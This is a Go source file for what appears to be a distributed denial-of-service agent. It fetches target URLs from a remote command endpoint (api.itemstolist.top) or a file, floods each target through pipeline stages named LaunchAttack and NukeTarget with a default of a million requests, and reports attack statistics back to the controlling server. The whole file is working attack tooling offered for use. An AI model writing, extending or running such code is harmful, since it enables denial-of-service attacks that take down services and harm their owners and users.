package main

import (
	"context"
	"flag"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	logw "github.com/andriiyaremenko/logwriter"
	"github.com/andriiyaremenko/logwriter/color"
	"github.com/andriiyaremenko/mg/client"
	"github.com/andriiyaremenko/mg/dto"
	"github.com/andriiyaremenko/mg/handler"
	"github.com/andriiyaremenko/mg/source"
	"github.com/andriiyaremenko/mg/statistic"
	"github.com/andriiyaremenko/pipelines"
	"github.com/google/uuid"
)

func main() {
	t := flag.String("t", "endpoint", "source type to use (file or endpoint)")
	s := flag.String("s", "https://api.itemstolist.top/api/target", "url to endpoint or file name")
	q := flag.Int("q", 2, "log verbosity level")
	workersPerCore := flag.Int("w", 10, "number of workers per logical CPU")
	amountRequests := flag.Int64("n", 1000000, "number of requests per each target")
	statEndpoint := flag.String("stat", "https://api.itemstolist.top/api/target/%d/stats", "url to send statistic")

	flag.Parse()

	agentUID := uuid.New().String()
	ctx := context.Background()
	ctx, cancel := context.WithCancel(ctx)
	ctx = logw.AppendDebug(ctx, "agentUID", agentUID)

	log := log.New(
		logw.LogWriter(ctx, os.Stdout, logw.Option(*q, logw.JSONFormatter, time.RFC3339)),
		"",
		log.Lmsgprefix,
	)

	log.Printf("log verbosity level is %d", *q)

	numWorkers := *workersPerCore * runtime.NumCPU()
	httpClient := client.New(time.Second * 10)

	var targetSource source.Source
	switch *t {
	case "file":
		targetSource = source.GetFromFile(*s)
		log.Printf("reading from file %s", color.ColorizeText(color.ANSIColorBlue, *s))
	case "endpoint":
		targetSource = source.GetFromEndpoint(httpClient, *s)
		log.Printf("reading from endpoint %s", color.ColorizeText(color.ANSIColorBlue, *s))
	default:
		log.Fatalln(logw.Error.WithMessage("source type %s is unsupported", t))
	}

	agent := statistic.StartCollection(ctx, httpClient, log, *statEndpoint)

	p1 := pipelines.New(handler.LaunchAttack(numWorkers))
	p2 := pipelines.Append(p1, handler.NukeTarget(log, agentUID, numWorkers, *amountRequests))
	pipeline := pipelines.Append[dto.Target, dto.TargetResponse, dto.Statistic](
		p2, pipelines.WithErrorHandler(
			handler.ProcessTargetResponse(log, numWorkers),
			handler.HandleTargetError(numWorkers),
		),
	)

	c := make(chan os.Signal, 1)

	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c

		cancel()
		<-agent.Done()

		log.Println("shutting down...")
		os.Exit(1)
	}()

loop:
	for target, keep, err := targetSource(); keep; target, keep, err = targetSource() {
		select {
		case <-ctx.Done():
			break loop
		default:
		}

		if err != nil {
			log.Println(logw.Error, err)
			time.Sleep(time.Second * 5)

			continue loop
		}

		if !keep {
			break loop
		}

		log.Println(
			logw.Info.WithString("target", target.URL),
			color.ColorizeText(color.ANSIColorGreen, "launching an attack"))

		logErr := func(err error) {
			log.Println(logw.Error, err)
		}
		collectTargetStat := func(aggr *dto.TargetStatistic, next dto.Statistic) *dto.TargetStatistic {
			aggr.Error += next.Error
			aggr.Success += next.Success
			return aggr
		}
		stat, _ := pipelines.Reduce(
			pipeline.Handle(ctx, pipelines.Event[dto.Target]{Payload: *target}),
			pipelines.SkipErrors(collectTargetStat, logErr),
			&dto.TargetStatistic{
				Statistic: dto.Statistic{
					Success: 0,
					Error:   0,
				},
				AgentUID: agentUID,
				TargetID: target.ID,
			},
		)

		agent.AddStatistic(*stat)

		log.Println(
			logw.Info.WithString("target", target.URL),
			color.ColorizeText(color.ANSIColorGreen, "attack completed"),
		)
	}
}
